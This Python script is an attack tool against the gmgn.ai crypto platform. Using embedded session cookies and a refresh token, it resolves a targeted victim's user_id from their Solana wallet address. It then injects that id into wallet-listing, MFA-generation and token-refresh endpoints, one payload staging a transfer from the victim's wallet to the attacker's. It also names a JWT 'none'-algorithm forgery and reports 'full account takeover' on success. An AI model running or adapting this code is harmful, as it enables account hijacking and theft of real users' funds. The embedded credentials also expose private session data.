#!/usr/bin/env python3
"""
USER_ID HIJACKING - CREATIVE IDOR HUNT

Theory: What if we can:
1. Get victim's user_id from their wallet
2. Use their user_id to generate a token AS THEM
3. Or exploit JWT that trusts user_id field
"""
import json
import requests
import jwt
import base64

COOKIES = {
    '_ga_UGLVBMV4Z0': 'GS1.2.1784147274019075.6b09445dc224ac4ed190f0fc17562c09.%2BWBECXoGBNBcg0Fo8XQ6Zw%3D%3D.MgwbCP7e6%2F%2Fgxg46Zi4hxw%3D%3D.NPARXjz5FNHX6j%2BVfQ4NyQ%3D%3D.lf0gy6vV0UZfM%2Buod%2FYChA%3D%3D',
    '__cf_bm': 'BiwqYrKdqGkcrH0ZLK9f_OKFba2OCsbJ28phLs8iDi0-1784147278.2017257-1.0.1.1-nFEvU2MgsYGgu6HECjXk37MIl.qPDHnGC9TNy4X5mLQ_hqdjAngW69Qng5QVjwhaQkvk8bzJQDDqab54zo2xpYk0LzVwc4rsuc8AaEkVbHhs1LgUDKxdYJRDqJicqnnR',
    'g_state': '{"i_l":1,"i_ll":1784064572835,"i_e":{"enable_itp_optimization":24},"i_et":1784064572835,"i_b":"ZKMAELdKKMvOaL6Er88DW7w1hSd2zpaA4oygW8X+Lo4"}',
    '_ga_0XM0LYXGC8': 'GS2.1.s1784146779$o42$g1$t1784147281$j50$l0$h0',
    '_ga': 'GA1.1.1499118900.1783283677',
    '_csrf': 'L6Giyxap0kezMoy_ZZVuEuos0BMQCWu2',
    '_did': 'c800ab0b7d01aa37bc93aacdcbce271e',
    '_wt': 'AWpf5OQ6yKhuZEDm40uECgKO0pTyVxTLhc8Ds-Q',
    'sid': 'gmgn%7Ca04bda1a723a8218b4953962ef8e9169'
}

REFRESH_TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiIwMGRhZTg3MC04NDkwLTRkMTktYmZjMC0zOWNlNDllOTA2YjUiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxNC0yMTE5LWM5MTMxNDEiLCJkZXZpY2VfaWQiOiJkZTYyMGE1Ny1kOThlLTQyOTMtYjAwNy01ZDMxNTQ1NWUyMWQiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxNTMyNDdiOWUwZTE4NGZiZWQzZmFjNzNmMTlkY2E2OGEiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2NjU2NjEyLCJpYXQiOjE3ODQwNjQ2MTIsImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiOTk0NzA5OTctZmQxMC00YmE2LWEyYTAtMzExODUwNTNhMTM2IiwibmJmIjoxNzg0MDY0NjEyLCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiMDBkYWU4NzAtODQ5MC00ZDE5LWJmYzAtMzljZTQ5ZTkwNmI1IiwidmVyIjoiMS4wIn0.H47Vj56YK1CYK08BpclIOKLFrootpc9Aud5BYkADA4GulAD2uaSEtwA5JYUG2Pj_PQak431Fk47_Q2R9rt4CSg"

VICTIM_SOL = "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"
OUR_USER_ID = "00dae870-8490-4d19-bfc0-39ce49e906b5"
OUR_SOL = "FzFNsCyNj8mP1pE6WzgHfwV5BJDdF3CXxN2ZmmVX7jg8"

PARAMS = {
    "device_id": "de620a57-d98e-4293-b007-5d315455e21d",
    "fp_did": "5154d56b50e3061629dca8bf8538b346",
    "client_id": "gmgn_web_20260714-2119-c913141",
    "from_app": "gmgn",
    "app_ver": "20260714-2119-c913141"
}

print("="*80)
print("🔥 USER_ID HIJACKING - CREATIVE ATTACK")
print("="*80)

# Refresh token
r = requests.post(
    "https://gmgn.ai/account/account/refresh_access_token",
    params=PARAMS,
    headers={
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    },
    cookies=COOKIES,
    json={"refresh_token": REFRESH_TOKEN},
    timeout=10
)

if r.status_code != 200 or r.json().get('code') != 0:
    print(f"Token refresh failed")
    exit(1)

ACCESS_TOKEN = r.json()['data']['data']['token']
print(f"✅ Token refreshed\n")

# Decode our JWT to see structure
print("="*80)
print("[ANALYSIS] Our JWT Structure")
print("="*80)

try:
    decoded = jwt.decode(ACCESS_TOKEN, options={"verify_signature": False})
    print(json.dumps(decoded, indent=2))
    print(f"\nOur user_id in JWT: {decoded.get('user_id')}")
except Exception as e:
    print(f"Decode error: {e}")

HEADERS = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
}

# ATTACK 1: Can we find victim's user_id from their wallet?
print("\n" + "="*80)
print("[ATTACK 1] Find Victim's user_id from Wallet Address")
print("="*80)

# Try different endpoints that might return user_id
user_lookup_endpoints = [
    {
        "name": "User Info by Wallet",
        "method": "POST",
        "url": "https://gmgn.ai/account/user_info",
        "payload": {"wallet_address": VICTIM_SOL}
    },
    {
        "name": "Cashback Profile (returns user_id)",
        "method": "GET",
        "url": "https://gmgn.ai/rebate/api/v1/cashback/profile",
        "params": {"address": VICTIM_SOL, "chain": "sol"}
    },
    {
        "name": "Dividend Info (might leak user_id)",
        "method": "POST",
        "url": "https://gmgn.ai/defi/quotation/v1/rebate/get_user_token_rebate_list",
        "payload": {"chain": "sol", "address": VICTIM_SOL}
    }
]

victim_user_id = None

for test in user_lookup_endpoints:
    print(f"\n--- {test['name']} ---")
    
    if test['method'] == 'GET':
        r = requests.get(
            test['url'],
            headers=HEADERS,
            cookies=COOKIES,
            params={**PARAMS, **test.get('params', {})},
            timeout=10
        )
    else:
        r = requests.post(
            test['url'],
            headers=HEADERS,
            cookies=COOKIES,
            params=PARAMS,
            json=test.get('payload', {}),
            timeout=10
        )
    
    print(f"Status: {r.status_code}")
    
    if r.status_code == 200:
        try:
            resp = r.json()
            print(f"Response: {json.dumps(resp, indent=2)[:500]}")
            
            # Look for user_id in response
            resp_str = json.dumps(resp)
            if 'user_id' in resp_str:
                data = resp.get('data', {})
                if isinstance(data, dict) and 'user_id' in data:
                    victim_user_id = data['user_id']
                    print(f"\n💀 FOUND VICTIM USER_ID: {victim_user_id}")
                    break
        except:
            print(f"Non-JSON: {r.text[:200]}")

# ATTACK 2: JWT manipulation (if we found user_id)
if victim_user_id:
    print("\n" + "="*80)
    print("[ATTACK 2] JWT Manipulation with Victim's user_id")
    print("="*80)
    print("Trying to forge a token with victim's user_id...")
    
    # Try various JWT manipulation attacks
    attacks = [
        {
            "name": "None Algorithm Attack",
            "desc": "Change alg to 'none' and remove signature"
        },
        {
            "name": "User_ID Parameter Injection",
            "desc": "Add user_id to request body/params"
        }
    ]
    
    for attack in attacks:
        print(f"\n{attack['name']}: {attack['desc']}")

# ATTACK 3: Refresh token with victim's user_id
print("\n" + "="*80)
print("[ATTACK 3] Parameter Pollution - user_id in Requests")
print("="*80)
print("What if endpoints trust user_id from request body over JWT?")

# Try calling privileged endpoints with victim_user_id in payload
if victim_user_id:
    print(f"\nTrying with victim_user_id: {victim_user_id}")
    
    test_payloads = [
        {
            "name": "Get User Wallets with victim user_id",
            "url": "https://gmgn.ai/account/wallet/get_wallets",
            "payload": {"user_id": victim_user_id}
        },
        {
            "name": "Generate MFA with victim user_id",
            "url": "https://gmgn.ai/wallet-api/v1/generate_mfa_params",
            "payload": {
                "user_id": victim_user_id,
                "usage": "transfer",
                "biz_params": {
                    "chain": "sol",
                    "from_address": VICTIM_SOL,
                    "to_address": OUR_SOL,
                    "amount": "1000000"
                }
            }
        }
    ]
    
    for test in test_payloads:
        print(f"\n--- {test['name']} ---")
        
        r = requests.post(
            test['url'],
            headers=HEADERS,
            cookies=COOKIES,
            params=PARAMS,
            json=test['payload'],
            timeout=10
        )
        
        print(f"Status: {r.status_code}")
        if r.status_code != 404:
            try:
                resp = r.json()
                print(f"Response: {json.dumps(resp, indent=2)[:400]}")
                
                if resp.get('code') == 0:
                    print(f"\n💀💀💀 {test['name']} WORKED!")
                    print(f"Full: {json.dumps(resp, indent=2)}")
            except:
                print(f"Non-JSON: {r.text[:200]}")

# ATTACK 4: Device_id / fingerprint hijacking
print("\n" + "="*80)
print("[ATTACK 4] Session Fixation - Can we generate token for victim?")
print("="*80)
print("What if we can call refresh_access_token with victim's user_id?")

if victim_user_id:
    # Try to refresh with victim's user_id in various places
    hijack_attempts = [
        {
            "name": "user_id in request body",
            "payload": {"refresh_token": REFRESH_TOKEN, "user_id": victim_user_id}
        },
        {
            "name": "user_id in params",
            "params_extra": {"user_id": victim_user_id}
        }
    ]
    
    for attempt in hijack_attempts:
        print(f"\n--- {attempt['name']} ---")
        
        r = requests.post(
            "https://gmgn.ai/account/account/refresh_access_token",
            params={**PARAMS, **attempt.get('params_extra', {})},
            headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            cookies=COOKIES,
            json=attempt.get('payload', {"refresh_token": REFRESH_TOKEN}),
            timeout=10
        )
        
        print(f"Status: {r.status_code}")
        if r.status_code == 200:
            try:
                resp = r.json()
                if resp.get('code') == 0:
                    new_token = resp['data']['data']['token']
                    decoded = jwt.decode(new_token, options={"verify_signature": False})
                    token_user_id = decoded.get('user_id')
                    
                    print(f"Token generated with user_id: {token_user_id}")
                    
                    if token_user_id == victim_user_id:
                        print("\n💀💀💀💀💀 TOKEN HIJACKING SUCCESSFUL!")
                        print(f"We got a token for victim user_id: {victim_user_id}")
                        print("This is CRITICAL - full account takeover")
            except Exception as e:
                print(f"Error: {e}")

print("\n" + "="*80)
print("SUMMARY")
print("="*80)
print("Tested creative user_id hijacking attacks")
print("Looking for ANY way to impersonate victim's user_id")
